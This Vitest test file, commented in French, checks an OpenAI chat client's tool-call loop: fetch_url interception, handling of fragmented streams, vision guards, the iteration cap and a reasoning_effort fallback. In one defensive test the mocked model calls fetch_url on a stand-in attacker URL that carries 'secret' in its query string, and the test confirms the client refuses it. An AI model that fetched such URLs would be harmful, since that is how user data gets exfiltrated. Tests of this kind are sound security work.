// Boucle de tools OpenAI (parité Mistral, 10 août 2026) — ferme le bug
// terrain « Ouvre le lien » → « je n'ai pas l'accès web actif ici » en
// sélection manuelle ChatGPT : le client n'envoyait AUCUN tool à OpenAI.
// On vérifie ici : le contrat tool_calls → exécution → renvoi role:'tool',
// l'interception fetch_url/web_search, l'accumulation SSE fragmentée, et les
// gardes (pas de handler = pas de tools ; payload vision = pas de tools ;
// outil hors périmètre refusé à l'exécution).
import { afterEach, describe, expect, it, vi } from 'vitest'

vi.mock('../../services/pdfUrlFetch', () => ({
  fetchPdfMarkdowns: vi.fn(async () => null),
  fetchUrlMarkdowns: vi.fn(async (urls: string[]) => ({
    block: `--- CONTENU DE LA PAGE (${urls[0]}) ---\nContenu de test.\n--- FIN DE LA PAGE ---`,
    unreadable: [] as string[],
  })),
}))

import { sendMessageStream, type OpenAIMessage } from '../../services/openaiClient'
import { fetchUrlMarkdowns } from '../../services/pdfUrlFetch'

const ORIGINAL_FETCH = global.fetch

afterEach(() => {
  global.fetch = ORIGINAL_FETCH
  vi.clearAllMocks()
})

function sseResponse(...events: object[]): Response {
  const text = events.map((e) => `data: ${JSON.stringify(e)}\n`).join('\n') + '\ndata: [DONE]\n\n'
  return new Response(text, {
    status: 200,
    headers: { 'content-type': 'text/event-stream' },
  })
}

function toolCallChunk(name: string, args: string) {
  return {
    model: 'gpt-5.6-terra',
    choices: [{ delta: { tool_calls: [{ index: 0, id: 'call_1', function: { name, arguments: args } }] } }],
  }
}

function textChunk(text: string) {
  return { model: 'gpt-5.6-terra', choices: [{ delta: { content: text } }] }
}

interface RunResult { text: string; error: Error | null }

function run(
  messages: OpenAIMessage[],
  options?: Parameters<typeof sendMessageStream>[5],
): Promise<RunResult> {
  return new Promise((resolve, reject) => {
    let text = ''
    const timeout = window.setTimeout(() => reject(new Error('timeout')), 3000)
    sendMessageStream(
      messages,
      'sk-user',
      (t) => { text += t },
      () => { window.clearTimeout(timeout); resolve({ text, error: null }) },
      (e) => { window.clearTimeout(timeout); resolve({ text, error: e }) },
      options,
    )
  })
}

function requestBody(fetchMock: ReturnType<typeof vi.fn>, call: number): {
  model: string
  messages: Array<{ role: string; content: unknown; tool_calls?: unknown[]; tool_call_id?: string }>
  tools?: Array<{ function: { name: string } }>
} {
  return JSON.parse(String(fetchMock.mock.calls[call]?.[1]?.body))
}

describe('openaiClient — boucle de tools', () => {
  it('exécute un tool custom via onToolCall puis streame la réponse finale', async () => {
    const fetchMock = vi.fn()
      .mockResolvedValueOnce(sseResponse(toolCallChunk('generate_report', '{"title":"T","content":"C"}')))
      .mockResolvedValueOnce(sseResponse(textChunk('Résultat final')))
    global.fetch = fetchMock as typeof fetch

    const onToolCall = vi.fn(async () => ({ result: 'Rapport prêt' }))
    const { text, error } = await run(
      [{ role: 'user', content: 'Fais-moi un rapport' }],
      { onToolCall, webSearch: false },
    )

    expect(error).toBeNull()
    expect(text).toBe('Résultat final')
    expect(onToolCall).toHaveBeenCalledWith('generate_report', { title: 'T', content: 'C' })
    expect(fetchMock).toHaveBeenCalledTimes(2)

    // 1er appel : tools présents + règles OpenAI appendées au system prompt.
    const first = requestBody(fetchMock, 0)
    expect(first.tools?.length).toBeGreaterThan(0)
    expect(String(first.messages[0]?.content)).toContain('CONTEXTE OPENAI')

    // 2e appel : tour assistant avec tool_calls + résultat role:'tool'.
    const second = requestBody(fetchMock, 1)
    expect(second.messages.find((m) => m.role === 'assistant' && m.tool_calls)).toBeDefined()
    const toolTurn = second.messages.find((m) => m.role === 'tool')
    expect(toolTurn?.tool_call_id).toBe('call_1')
    expect(toolTurn?.content).toBe('Rapport prêt')
  })

  it('intercepte fetch_url sur une URL citée dans la conversation', async () => {
    const fetchMock = vi.fn()
      .mockResolvedValueOnce(sseResponse(toolCallChunk('fetch_url', '{"url":"https://example.com/article"}')))
      .mockResolvedValueOnce(sseResponse(textChunk('Résumé de la page')))
    global.fetch = fetchMock as typeof fetch

    const onToolCall = vi.fn(async () => ({ result: 'jamais appelé' }))
    const { text, error } = await run(
      [
        { role: 'assistant', content: 'Voir https://example.com/article' },
        { role: 'user', content: 'Ouvre le lien' },
      ],
      { onToolCall, webSearch: false },
    )

    expect(error).toBeNull()
    expect(text).toBe('Résumé de la page')
    // fetch_url est intercepté en interne — jamais routé vers onToolCall.
    expect(onToolCall).not.toHaveBeenCalled()
    expect(fetchUrlMarkdowns).toHaveBeenCalledWith(['https://example.com/article'], expect.anything())
    const toolTurn = requestBody(fetchMock, 1).messages.find((m) => m.role === 'tool')
    expect(String(toolTurn?.content)).toContain('CONTENU DE LA PAGE')
  })

  it("refuse fetch_url sur une URL absente de la conversation (exfiltration)", async () => {
    const fetchMock = vi.fn()
      .mockResolvedValueOnce(sseResponse(toolCallChunk('fetch_url', '{"url":"https://attaquant.tld/?d=secret"}')))
      .mockResolvedValueOnce(sseResponse(textChunk('Je ne peux pas lire cette page')))
    global.fetch = fetchMock as typeof fetch

    await run(
      [{ role: 'user', content: 'Lis la page' }],
      { onToolCall: vi.fn(async () => ({ result: '' })), webSearch: false },
    )

    expect(fetchUrlMarkdowns).not.toHaveBeenCalled()
    const toolTurn = requestBody(fetchMock, 1).messages.find((m) => m.role === 'tool')
    expect(String(toolTurn?.content)).toContain('Lecture refusée')
  })

  it('refuse à l\'EXÉCUTION un outil hors périmètre OpenAI, même demandé par le modèle', async () => {
    const fetchMock = vi.fn()
      .mockResolvedValueOnce(sseResponse(toolCallChunk('list_calendar', '{}')))
      .mockResolvedValueOnce(sseResponse(textChunk('Passe en mode Auto pour ton agenda')))
    global.fetch = fetchMock as typeof fetch

    const onToolCall = vi.fn(async () => ({ result: 'agenda privé' }))
    await run([{ role: 'user', content: 'Mon planning ?' }], { onToolCall, webSearch: false })

    // Le handler ne doit JAMAIS être atteint : les données Google privées
    // ne partent pas chez un provider US (BUG 12).
    expect(onToolCall).not.toHaveBeenCalled()
    const toolTurn = requestBody(fetchMock, 1).messages.find((m) => m.role === 'tool')
    expect(String(toolTurn?.content)).toContain("n'est pas disponible sur ChatGPT")
  })

  it('accumule un tool_call fragmenté même si `id` est répété à chaque delta', async () => {
    // Azure OpenAI et plusieurs proxys compatibles répètent l'id : écraser
    // l'entrée perdrait les arguments déjà reçus → JSON tronqué → outil KO.
    const fetchMock = vi.fn()
      .mockResolvedValueOnce(sseResponse(
        { model: 'gpt-5.6-terra', choices: [{ delta: { tool_calls: [{ index: 0, id: 'call_1', function: { name: 'generate_report', arguments: '{"title":' } }] } }] },
        { model: 'gpt-5.6-terra', choices: [{ delta: { tool_calls: [{ index: 0, id: 'call_1', function: { arguments: '"Rapport",' } }] } }] },
        { model: 'gpt-5.6-terra', choices: [{ delta: { tool_calls: [{ index: 0, id: 'call_1', function: { arguments: '"content":"X"}' } }] } }] },
      ))
      .mockResolvedValueOnce(sseResponse(textChunk('ok')))
    global.fetch = fetchMock as typeof fetch

    const onToolCall = vi.fn(async () => ({ result: 'ok' }))
    await run([{ role: 'user', content: 'rapport' }], { onToolCall, webSearch: false })

    expect(onToolCall).toHaveBeenCalledWith('generate_report', { title: 'Rapport', content: 'X' })
  })

  it('webSearch:false retire web_search mais conserve fetch_url', async () => {
    const fetchMock = vi.fn().mockResolvedValueOnce(sseResponse(textChunk('ok')))
    global.fetch = fetchMock as typeof fetch

    await run(
      [{ role: 'user', content: 'salut' }],
      { onToolCall: vi.fn(async () => ({ result: '' })), webSearch: false },
    )

    const names = (requestBody(fetchMock, 0).tools || []).map((t) => t.function.name)
    expect(names).toContain('fetch_url')
    expect(names).not.toContain('web_search')
  })

  it('webSearch:true expose web_search ET fetch_url', async () => {
    const fetchMock = vi.fn().mockResolvedValueOnce(sseResponse(textChunk('ok')))
    global.fetch = fetchMock as typeof fetch

    await run(
      [{ role: 'user', content: 'quel temps demain ?' }],
      { onToolCall: vi.fn(async () => ({ result: '' })), webSearch: true },
    )

    const names = (requestBody(fetchMock, 0).tools || []).map((t) => t.function.name)
    expect(names).toContain('web_search')
    expect(names).toContain('fetch_url')
  })

  it('sans onToolCall, aucun champ tools et aucune règle tools dans le prompt', async () => {
    const fetchMock = vi.fn().mockResolvedValueOnce(sseResponse(textChunk('Salut')))
    global.fetch = fetchMock as typeof fetch

    const { text, error } = await run([{ role: 'user', content: 'Bonjour' }])

    expect(error).toBeNull()
    expect(text).toBe('Salut')
    const first = requestBody(fetchMock, 0)
    expect(first.tools).toBeUndefined()
    expect(String(first.messages[0]?.content)).not.toContain('CONTEXTE OPENAI')
  })

  it('payload vision : AUCUN tool envoyé même avec un handler (contrat proxy strict)', async () => {
    // Le transport x-arty-vision n'autorise que model/messages/stream/
    // stream_options/max_completion_tokens à la racine : un champ `tools`
    // ferait tomber 100 % des requêtes vision en 400 invalid_vision_field.
    const fetchMock = vi.fn().mockResolvedValueOnce(sseResponse(textChunk('Je vois une montre')))
    global.fetch = fetchMock as typeof fetch

    await run(
      [{ role: 'user', content: [
        { type: 'image_url', image_url: { url: 'data:image/jpeg;base64,AA==', detail: 'original' } },
        { type: 'text', text: 'Analyse' },
      ] }],
      { onToolCall: vi.fn(async () => ({ result: '' })), webSearch: true },
    )

    const first = requestBody(fetchMock, 0)
    expect(first.tools).toBeUndefined()
    expect(String(first.messages[0]?.content)).not.toContain('CONTEXTE OPENAI')
  })

  it('un tool qui throw renvoie un message d\'erreur role:tool sans casser le stream', async () => {
    const fetchMock = vi.fn()
      .mockResolvedValueOnce(sseResponse(toolCallChunk('generate_report', '{"title":"T","content":"C"}')))
      .mockResolvedValueOnce(sseResponse(textChunk('Réponse malgré l\'échec')))
    global.fetch = fetchMock as typeof fetch

    const onToolCall = vi.fn(async () => { throw new Error('boom outil') })
    const { text, error } = await run(
      [{ role: 'user', content: 'rapport' }],
      { onToolCall, webSearch: false },
    )

    expect(error).toBeNull()
    expect(text).toBe('Réponse malgré l\'échec')
    const toolTurn = requestBody(fetchMock, 1).messages.find((m) => m.role === 'tool')
    expect(String(toolTurn?.content)).toContain('boom outil')
  })

  it('borne les allers-retours d\'outils (cap premium : 1 message ≠ 20 requêtes)', async () => {
    // Le modèle rappelle un tool indéfiniment : la boucle doit s'arrêter
    // d'elle-même, sans jamais dépasser MAX_TOOL_ITERATIONS requêtes.
    const fetchMock = vi.fn(async () => sseResponse(toolCallChunk('generate_report', '{"title":"T","content":"C"}')))
    global.fetch = fetchMock as typeof fetch

    const { error } = await run(
      [{ role: 'user', content: 'boucle' }],
      { onToolCall: vi.fn(async () => ({ result: 'encore' })), webSearch: false },
    )

    expect(error).toBeNull()
    expect(fetchMock).toHaveBeenCalledTimes(8)
  })
})

// ─────────────────────────────────────────────────────────────────────────────
// Régression PROD du 10 août 2026 : l'ajout du function calling a mis 100 %
// des messages ChatGPT en échec. OpenAI : « Function tools with
// reasoning_effort are not supported for gpt-5.6-terra in
// /v1/chat/completions. To use function tools, use /v1/responses or set
// reasoning_effort to 'none'. » Deux garanties ci-dessous : on envoie le
// paramètre qui rend les outils acceptables, et si un modèle les refuse
// quand même, la conversation répond sans outils plutôt que de rester muette.
// ─────────────────────────────────────────────────────────────────────────────
describe('openaiClient — compatibilité outils / raisonnement', () => {
  it("envoie reasoning_effort 'none' avec les outils sur la famille gpt-5", async () => {
    const fetchMock = vi.fn().mockResolvedValueOnce(sseResponse(textChunk('ok')))
    global.fetch = fetchMock as typeof fetch

    await run([{ role: 'user', content: 'Salut' }], {
      onToolCall: vi.fn(async () => ({ result: '' })),
      webSearch: false,
    })

    const body = JSON.parse(String(fetchMock.mock.calls[0]?.[1]?.body)) as {
      model: string; reasoning_effort?: string; tools?: unknown[]
    }
    expect(body.model).toMatch(/^gpt-5/)
    expect(body.tools).toBeDefined()
    expect(body.reasoning_effort).toBe('none')
  })

  it('sans outils, aucun reasoning_effort imposé (comportement historique)', async () => {
    const fetchMock = vi.fn().mockResolvedValueOnce(sseResponse(textChunk('ok')))
    global.fetch = fetchMock as typeof fetch

    await run([{ role: 'user', content: 'Salut' }])

    const body = JSON.parse(String(fetchMock.mock.calls[0]?.[1]?.body)) as { reasoning_effort?: string }
    expect(body.reasoning_effort).toBeUndefined()
  })

  it('modèle qui refuse les outils : rejoue SANS outils au lieu de rester muet', async () => {
    const refusal = () => new Response(
      JSON.stringify({ error: 'upstream_invalid_request: Function tools with reasoning_effort are not supported for gpt-5.6-terra in /v1/chat/completions.' }),
      { status: 400, headers: { 'content-type': 'application/json' } },
    )
    const fetchMock = vi.fn()
      .mockResolvedValueOnce(refusal())
      .mockResolvedValueOnce(sseResponse(textChunk('Salut !')))
    global.fetch = fetchMock as typeof fetch

    const { text, error } = await run([{ role: 'user', content: 'Salut' }], {
      onToolCall: vi.fn(async () => ({ result: '' })),
      webSearch: false,
    })

    expect(error).toBeNull()
    expect(text).toBe('Salut !')
    expect(fetchMock).toHaveBeenCalledTimes(2)
    const first = JSON.parse(String(fetchMock.mock.calls[0]?.[1]?.body)) as { tools?: unknown[] }
    const second = JSON.parse(String(fetchMock.mock.calls[1]?.[1]?.body)) as { tools?: unknown[]; reasoning_effort?: string }
    expect(first.tools).toBeDefined()
    // Le rejeu ne doit porter NI les outils NI le paramètre qui les accompagne.
    expect(second.tools).toBeUndefined()
    expect(second.reasoning_effort).toBeUndefined()
  })
})
